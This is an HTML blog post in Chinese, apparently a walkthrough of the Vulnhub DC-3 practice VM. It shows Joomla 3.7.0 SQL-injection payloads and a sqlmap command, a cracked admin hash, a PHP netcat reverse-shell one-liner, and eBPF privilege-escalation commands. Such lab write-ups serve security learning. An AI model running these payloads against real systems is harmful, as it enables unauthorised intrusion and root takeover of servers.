@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="ST0new">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="Vulnhub之DC-3 joomla注入和ubutnu16.04 提权">
+  <meta property="og:description" content="一个ctfer，web渗透测试小白">
+  <meta property="og:site_name" content="ST0new的小站">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://yoursite.com">
+  
+    <link rel="alternate" href="/atom.xml" title="ST0new的小站" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>ST0new的小站</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-light.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">Vulnhub之DC-3 joomla注入和ubutnu16.04 提权</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/ST0new/">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:<your-email-address>">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By ST0new</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2019-10-04</span>
+            <span class="time">11:04:45</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/靶机/">靶机</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/joomla-cms-注入/">#joomla cms 注入</a> <a class="tag" href="/tags/ubuntu-16-04-bpf-提权/">#ubuntu 16.04 bpf 提权</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>常见cms漏洞 和系统版本提权</p>
+<a id="more"></a>
+
+<h1 id="Vulnhub靶机之DC-3"><a href="#Vulnhub靶机之DC-3" class="headerlink" title="Vulnhub靶机之DC-3"></a>Vulnhub靶机之DC-3</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p> 刚考完试，然而不能放弃对技术的热爱，又重新拾起了dc准备把他们6个做完  </p>
+<p> 今天介绍的是dc-3 ，来看看作者对他的评价</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">描述：</span><br><span class="line"></span><br><span class="line">DC-3是另一个专门建造的脆弱实验室，旨在获得渗透测试领域的经验。</span><br><span class="line"></span><br><span class="line">与之前的DC版本一样，这个版本在设计时考虑了初学者，虽然这一次，只有一个标志，一个入口点，根本没有线索。</span><br><span class="line">Linux技能和熟悉Linux命令行是必须的，基本渗透测试工具的一些经验也是必须的。</span><br><span class="line"></span><br><span class="line">对于初学者来说，谷歌可以提供很大的帮助，但是你总是可以在@ DCAU7上给我发信息以获得帮助，让你再次前行。 但请注意：我不会给你答案，相反，我会告诉你如何前进。</span><br><span class="line"></span><br><span class="line">对于那些有CTF和Boot2Root挑战经验的人来说，这可能不会花费你很长时间（实际上，你可能很容易花费不到20分钟）。</span><br><span class="line"></span><br><span class="line">如果是这种情况，并且如果您希望它更具挑战性，您可以随时重做挑战并探索获得根并获得旗帜的其他方式</span><br></pre></td></tr></table></figure>
+
+<h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>首先设置靶机为NAT模式,如果获取不到ip 删除网络适配器重新添加</p>
+<p>ip地址：</p>
+<blockquote>
+<p>kali： 192.168.31.225</p>
+<p>DC-3： 192.168.31.19</p>
+</blockquote>
+<h2 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h2><p>由于下载的靶机是vbox的使用的，在vmware上出现了一些小问题，所以耽搁了一点时间。</p>
+<p>解决方法： vmware打开kali并且vbox打开DC-3 或者都使用vbox去打开</p>
+<ul>
+<li><p>扫描网段</p>
+<p>命令：<code>nmap -sn 192.168.31.0/24</code></p>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161450.png" alt></p>
+<ul>
+<li><p>扫描端口</p>
+<p>命令： <code>nmap -sS 192.168.31.19</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161610.png" alt></p>
+</li>
+<li><p>访问网站</p>
+<p>url: <a href="http://192.168.31.19" target="_blank" rel="noopener">http://192.168.31.19</a></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161821.png" alt></p>
+</li>
+<li><p>指纹获取</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161925.png" alt></p>
+</li>
+<li><p>看起来是joomla的cms，使用扫描工具跑一下</p>
+<p>这里使用kali自带的扫描工具</p>
+<p>命令： <code>joomscan -u http://192.168.31.19</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720162351.png" alt></p>
+<p>看来没有什么结果，在搜索的同时 ，我们尝试一些简单的操作，比如弱密码，sql注入，但是看起来情况不容乐观啥都没有，</p>
+<p>扫描结果出来了，看看扫描到了版本信息，后台</p>
+<p>版本信息： <code>Joomla 3.7.0</code></p>
+<p>后台目录： <code>http://192.168.31.19/administrator/</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720162744.png" alt></p>
+</li>
+<li><p>查找相关漏洞</p>
+<p>发现这个版本存在sql注入漏洞</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720163337.png" alt></p>
+<p>接下来就是复现一下了</p>
+</li>
+<li><p>通过搜索发现可以注入获取到hash密码</p>
+<p>参考链接： <a href="https://www.anquanke.com/post/id/86119" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86119</a></p>
+<p>这里先借用工具试试： <a href="https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py" target="_blank" rel="noopener">https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py</a></p>
+<p>复制到本地，然后执行命令:<code>python joomblah.py http://192.168.31.19</code></p>
+<p>获取到user的信息</p>
+<p><code>Found user [&#39;629&#39;, &#39;admin&#39;, &#39;admin&#39;, &#39;freddy@norealaddress.net&#39;,&#39;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#39;, &#39;&#39;, &#39;&#39;]</code></p>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720165327.png" alt></p>
+<p>​    手工注入</p>
+<p>​    获取hash 或者可以获取session来登录</p>
+<p>​    附上poc 参考链接: <a href="https://www.exploit-db.com/exploits/42033" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/42033</a></p>
+<p>​    using sqlmap</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<p>1获取当前的用户</p>
+<p>​    index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)</p>
+<p>​    也可以获取最近登录的session 这样也可以登录后台</p>
+<p>​    2 获取版本</p>
+<p>​    index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(version())),0)</p>
+<p>​    <code>XPATH syntax error: &#39;&gt;5.7.25-0ubuntu0.16.04.2</code></p>
+<p>​    3 查数据库</p>
+<p>​    index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(database())),0)</p>
+<p>​    <code>XPATH syntax error: &#39;&gt;joomladb&#39;</code></p>
+<p>​    参考链接</p>
+<p>​    <a href="https://www.jianshu.com/p/76451380b129" target="_blank" rel="noopener">https://www.jianshu.com/p/76451380b129</a></p>
+<p>​    4 获取表</p>
+<p>​    index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3a,    (SELECT(concat(0x3e,TABLE_NAME))FROM(information_schema.tables) where table_schema like         database() LIMIT 1,1),0x3a),1)</p>
+<p>​    但是获取的没有前缀</p>
+<p>​    我们通过16进制去获取到完整的表名，然后在通过转换获取到他的字符串</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720202649.png" alt></p>
+<p>​    5 获取列名<br>​    UpdateXML(2,concat(0x3a,(SELECT(concat(COLUMN_NAME))FROM(information_schema.COLUMNS) WHERE TABLE_NAME LIKE 0x6c6d6278635f636f6e74656e7474 LIMIT 0,1),0x3a),1)</p>
+<ul>
+<li><p>登录</p>
+<p>破解hash值录<code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code><br>爆破得到密码： snoopy</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720204736.png" alt></p>
+</li>
+<li><p>寻找上传点</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720205802.png" alt></p>
+</li>
+<li><p>反弹shell</p>
+<p>写入代码</p>
+<p><code>&lt;?php system(‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.1 1337 &gt;/tmp/f’); ?&gt;</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720210056.png" alt></p>
+</li>
+<li><p>kali 监听 获取shell</p>
+<p>这里切记一定要在同一个网段下，虽然两个网段也能通信但是shell反弹失败</p>
+<p>获取交互模式</p>
+<p><code>python &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>注意： 如果交互模式不成功，就换个文件名或者换个路径重新反弹交互shell</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720213055.png" alt></p>
+</li>
+</ul>
+<ul>
+<li><p>获取信息</p>
+<p>获取版本信息</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720213332.png" alt></p>
+</li>
+<li><p>搜索相关系统漏洞尝试提权</p>
+<p>参考： <a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a></p>
+<p>然后我参照大佬的选用了本地拒绝服务漏洞提权</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720214214.png" alt></p>
+<p>如果要复现漏洞需要检查版本，用户权限</p>
+<p>将提权下载到本地，编译后，使用wget下载，这个下载了好久才下载好</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720235102.png" alt></p>
+</li>
+</ul>
+<p>  之后就是按步骤走了</p>
+<p>  下载两个文件<br>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar xf exploit.tar  </span><br><span class="line">cd ebpf_mapfd_doubleput_exploit  </span><br><span class="line">./compile.sh  </span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure></p>
+<p>  <img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720235919.png" alt></p>
+<ul>
+<li><p>提权成功</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190721000019.png" alt></p>
+</li>
+<li><p>获取flag</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190721000242.png" alt></p>
+</li>
+</ul>
+<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>​    这次花费了大量的时间调试，对于各种问题的解决方式有待提高，今日份的靶机奉上，本靶机只适合学习不要将其中的技术用于其他途径。</p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
